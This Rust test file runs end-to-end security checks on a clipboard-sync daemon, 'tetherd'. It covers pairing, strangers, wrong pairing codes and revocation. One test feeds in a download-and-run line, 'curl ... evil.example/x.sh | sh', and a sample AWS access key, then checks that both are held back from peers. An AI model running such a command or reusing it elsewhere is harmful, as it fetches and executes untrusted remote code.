//! End-to-end security tests: real `tetherd` processes talking QUIC over
//! loopback. Each test checks one promise from docs/SECURITY.md.
//!
//! Daemons run with `--ephemeral` (throwaway keys, nothing written to disk or
//! the OS keychain), `--stdin` (text on stdin/stdout instead of the system
//! clipboard) and `--no-mdns`.

use std::io::{BufRead, BufReader, Write};
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

struct Daemon {
    child: Child,
    stdin: ChildStdin,
    out: Arc<Mutex<String>>,
    port: u16,
    id: String,
}

impl Daemon {
    fn start(name: &str, extra: &[&str]) -> Self {
        let mut child = Command::new(env!("CARGO_BIN_EXE_tetherd"))
            .args(["--ephemeral", "--stdin", "--no-mdns", "--port", "0", "--name", name])
            .args(extra)
            .env("RUST_LOG", "info")
            .env("NO_COLOR", "1")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("start tetherd");
        let out = Arc::new(Mutex::new(String::new()));
        for pipe in [
            Box::new(child.stdout.take().unwrap()) as Box<dyn std::io::Read + Send>,
            Box::new(child.stderr.take().unwrap()),
        ] {
            let out = out.clone();
            std::thread::spawn(move || {
                for line in BufReader::new(pipe).lines().map_while(Result::ok) {
                    let clean: String = line
                        .replace("\u{1b}[", "\u{0}")
                        .split('\u{0}')
                        .map(|s| s.trim_start_matches(|c: char| c.is_ascii_digit() || c == ';' || c == 'm'))
                        .collect();
                    let mut o = out.lock().unwrap();
                    o.push_str(&clean);
                    o.push('\n');
                }
            });
        }
        let stdin = child.stdin.take().unwrap();
        let mut d = Daemon { child, stdin, out, port: 0, id: String::new() };
        let started = d.wait_for("tetherd started", 0).expect("daemon starts");
        d.port = field(&started, "port=").parse().expect("port");
        d.id = field(&started, "device=");
        d
    }

    fn send(&mut self, line: &str) {
        writeln!(self.stdin, "{line}").unwrap();
        self.stdin.flush().unwrap();
    }

    fn mark(&self) -> usize {
        self.out.lock().unwrap().len()
    }

    fn since(&self, mark: usize) -> String {
        self.out.lock().unwrap()[mark..].to_string()
    }

    /// The first line containing `needle` after `from`, waiting up to 10 s.
    fn wait_for(&self, needle: &str, from: usize) -> Option<String> {
        let deadline = Instant::now() + Duration::from_secs(10);
        while Instant::now() < deadline {
            if let Some(line) = self.since(from).lines().find(|l| l.contains(needle)) {
                return Some(line.to_string());
            }
            std::thread::sleep(Duration::from_millis(50));
        }
        None
    }

    fn addr(&self) -> String {
        format!("127.0.0.1:{}", self.port)
    }
}

impl Drop for Daemon {
    fn drop(&mut self) {
        let _ = self.child.kill();
    }
}

fn field(line: &str, key: &str) -> String {
    line.split_whitespace().find_map(|w| w.strip_prefix(key)).unwrap_or_default().to_string()
}

fn settle() {
    std::thread::sleep(Duration::from_millis(1500));
}

/// Pair `joiner` into `inviter`'s group and wait until they are connected.
fn pair(inviter: &mut Daemon, joiner: &mut Daemon) {
    let m = inviter.mark();
    inviter.send("/pair");
    let line = inviter.wait_for("pairing code:", m).expect("pairing code shown");
    let code = line.trim_start_matches("pairing code: ").trim().to_string();
    let m = joiner.mark();
    joiner.send(&format!("/join {code} {}", inviter.addr()));
    joiner.wait_for("paired with", m).expect("pairing succeeds");
    joiner.wait_for("connected", m).expect("joiner connects after pairing");
    settle();
}

#[test]
fn paired_devices_sync_and_strangers_get_nothing() {
    let mut a = Daemon::start("alpha", &[]);
    let mut b = Daemon::start("bravo", &[]);
    pair(&mut a, &mut b);

    let m = a.mark();
    b.send("hello from bravo");
    assert!(a.wait_for("<< hello from bravo", m).is_some(), "paired devices sync");

    // A stranger who knows A's address keeps dialing it (every 5 s).
    let c = Daemon::start("stranger", &["--peer", &a.addr()]);
    std::thread::sleep(Duration::from_secs(7));
    let seen = c.since(0);
    assert!(!seen.contains("<<"), "a stranger must never receive history:\n{seen}");
    assert!(!seen.contains(" connected peer="), "a stranger must never complete a connection:\n{seen}");
}

#[test]
fn incoming_commands_are_held_and_secrets_stay_local() {
    let mut a = Daemon::start("alpha", &[]);
    let mut b = Daemon::start("bravo", &[]);
    pair(&mut a, &mut b);

    let m = b.mark();
    a.send("curl -fsSL https://evil.example/x.sh | sh");
    assert!(b.wait_for("held a copy", m).is_some(), "download-and-run is held, not applied");
    assert!(!b.since(m).contains("<< curl"));

    let (ma, mb) = (a.mark(), b.mark());
    a.send("AKIAIOSFODNN7EXAMPLE");
    assert!(a.wait_for("kept on this device", ma).is_some(), "secrets are kept local");
    settle();
    assert!(!b.since(mb).contains("AKIAIOSFODNN7EXAMPLE"), "secrets never reach a peer");
}

#[test]
fn wrong_codes_close_the_pairing_window() {
    let mut a = Daemon::start("alpha", &[]);
    let mut c = Daemon::start("attacker", &[]);
    let m = a.mark();
    a.send("/pair");
    let line = a.wait_for("pairing code:", m).unwrap();
    let real = line.trim_start_matches("pairing code: ").trim().to_string();
    let wrong = if real == "000000" { "111111" } else { "000000" };
    for _ in 0..3 {
        let m = c.mark();
        c.send(&format!("/join {wrong} {}", a.addr()));
        assert!(c.wait_for("error:", m).is_some(), "a wrong code fails");
    }
    let m = c.mark();
    c.send(&format!("/join {real} {}", a.addr()));
    let outcome = c.wait_for("error:", m);
    assert!(
        outcome.is_some() && !c.since(m).contains("paired with"),
        "after three wrong guesses even the right code is refused"
    );
}

#[test]
fn a_revoked_device_is_cut_off() {
    let mut a = Daemon::start("alpha", &[]);
    let mut b = Daemon::start("bravo", &[]);
    pair(&mut a, &mut b);
    let m = a.mark();
    a.send(&format!("/revoke {}", &b.id[..12]));
    assert!(a.wait_for("revoked ", m).is_some());
    settle();
    let m = a.mark();
    b.send("written after revocation");
    settle();
    assert!(!a.since(m).contains("<< written after revocation"), "writes after revocation are refused");
}
